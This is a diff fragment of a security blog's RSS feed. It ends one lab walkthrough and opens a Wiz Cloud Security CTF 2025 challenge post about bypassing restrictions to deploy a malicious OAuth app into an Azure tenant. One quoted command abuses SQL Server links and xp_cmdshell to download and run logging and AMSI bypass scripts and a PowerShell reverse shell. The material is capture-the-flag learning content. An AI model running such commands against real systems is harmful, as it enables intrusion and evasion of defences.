@@ -1417,9 +1417,11 @@ Links       :
 &lt;pre&gt;&lt;code&gt;Get-SQLServerLinkCrawl -Instance dcorp-mssql -Query &apos;exec master..xp_cmdshell &apos;&apos;powershell -c &quot;iex (iwr -UseBasicParsing http://172.16.100.xx/sbloggingbypass.txt);iex (iwr -UseBasicParsing http://172.16.100.xx/amsibypass.txt);iex (iwr -UseBasicParsing http://172.16.100.xx/Invoke-PowerShellTcpEx.ps1)&quot;&apos;&apos;&apos; -QueryTarget eu-sql20
 &lt;/code&gt;&lt;/pre&gt;
 </content:encoded></item><item><title>WIZ Cloud Security CTF 2025 Challenge 3</title><link>https://25pm-sumio.github.io/posts/2025/12/14/01/</link><guid isPermaLink="true">https://25pm-sumio.github.io/posts/2025/12/14/01/</guid><pubDate>Tue, 16 Dec 2025 00:00:00 GMT</pubDate><content:encoded>&lt;h2&gt;Breaking The Barriers&lt;/h2&gt;
+&lt;blockquote&gt;
 &lt;p&gt;As an APT group targeting Azure, you&apos;ve discovered a web app that creates admin users, but they are heavily restricted. To gain initial access, you&apos;ve created a malicious OAuth app in your tenant and now seek to deploy it into the victim&apos;s tenant. Can you bypass the restrictions and capture the flag?&lt;/p&gt;
 &lt;p&gt;The shell environment has been preloaded with your malicious OAuth app credentials and the target web app endpoint as environment variables. Use &apos;env | grep AZURE&apos; or &apos;echo $WEB_APP_ENDPOINT&apos; to view them.&lt;/p&gt;
 &lt;p&gt;Good luck!&lt;/p&gt;
+&lt;/blockquote&gt;
 &lt;p&gt;关键信息逐句拆：&lt;/p&gt;
 &lt;blockquote&gt;
 &lt;p&gt;web app that creates admin users, but they are heavily restricted&lt;/p&gt;
